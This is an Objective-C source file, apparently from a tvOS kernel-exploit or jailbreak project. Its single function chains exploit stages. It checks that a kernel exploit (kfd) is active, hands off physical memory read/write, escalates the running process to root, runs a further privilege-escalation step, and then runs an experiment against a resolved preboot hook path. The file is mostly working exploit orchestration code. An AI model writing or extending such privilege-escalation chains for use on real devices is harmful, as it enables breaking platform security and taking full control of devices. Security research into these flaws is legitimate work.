#import "dt_build688a_client.h"
#import "dt_kcall_planb.h"
#import "dt_physrw.h"
#import "dt_build710_preboot.h"
#import "DTRunLogger.h"
#import "kfd_tvos.h"
#import "dt_kernel_exploit.h"
#import "primitives.h"
#import "kernel.h"

#import <unistd.h>

typedef void (^dt688a_log_fn)(NSString *line);

static void dt688a_log(dt688a_log_fn log, NSString *line)
{
    [[DTRunLogger shared] log:line];
    if (log)
        log(line);
}

static void dt688a_emit(dt688a_log_fn log, NSString *marker)
{
    dt688a_log(log, marker);
    [[DTRunLogger shared] logStage:marker];
}

int dt_build688a_run_wall2(void (^log)(NSString *line), NSString **verdictOut)
{
    dt688a_emit(log, @"KCALL689_PHASE_BEGIN");

    if (!dt_kernel_exploit_is_active()) {
        if (verdictOut)
            *verdictOut = @"KCALL689_KFD_INACTIVE";
        return -1;
    }

    if (dt_build_physrw_handoff_only(log) != 0) {
        if (verdictOut)
            *verdictOut = @"KCALL689_PHYSRW_FAIL";
        return -2;
    }

    if (getuid() != 0) {
        uint64_t proc = proc_find(getpid());
        if (proc && dt_build_phys_root_esc(proc, log) == 0 && getuid() == 0) {
            dt688a_log(log, @"[+] build689 root esc OK uid=0");
        }
        if (proc)
            proc_rele(proc);
    }

    if (getuid() != 0) {
        if (verdictOut)
            *verdictOut = @"KCALL689_ROOT_FAIL";
        return -3;
    }

    int priv_r = -1;
    uint64_t self_proc = proc_find(getpid());
    if (self_proc) {
        priv_r = dt_build97_privesc_preserve_slot0(self_proc, log);
        proc_rele(self_proc);
    }
    if (priv_r != 0) {
        if (verdictOut)
            *verdictOut = @"KCALL689_BUILD97_FAIL";
        return -4;
    }

    dt688a_emit(log, @"KCALL689_NO_OPAINJECT");
    dt688a_emit(log, @"KCALL689_NO_STASH");

    NSString *consumePath = dt710_resolve_hook_path();
    if (!consumePath.length) {
        if (verdictOut)
            *verdictOut = @"BUILD102710_PREBOOT_PATH_RESOLVE_FAIL";
        return -5;
    }
    dt688a_emit(log, [NSString stringWithFormat:@"BUILD102710_WALL2_TARGET_PATH=%@", consumePath]);

    NSString *kernelVerdict = nil;
    int r = dt688a_run_wall2_experiment(consumePath.UTF8String, log, &kernelVerdict);
    if (r != 0) {
        if (verdictOut)
            *verdictOut = kernelVerdict ?: @"KCALL689_WALL2_FAIL";
        return r;
    }

    if (verdictOut)
        *verdictOut = kernelVerdict ?: @"KCALL689_WALL2_PASS";
    dt688a_emit(log, @"KCALL689_PHASE_PASS");
    return 0;
}
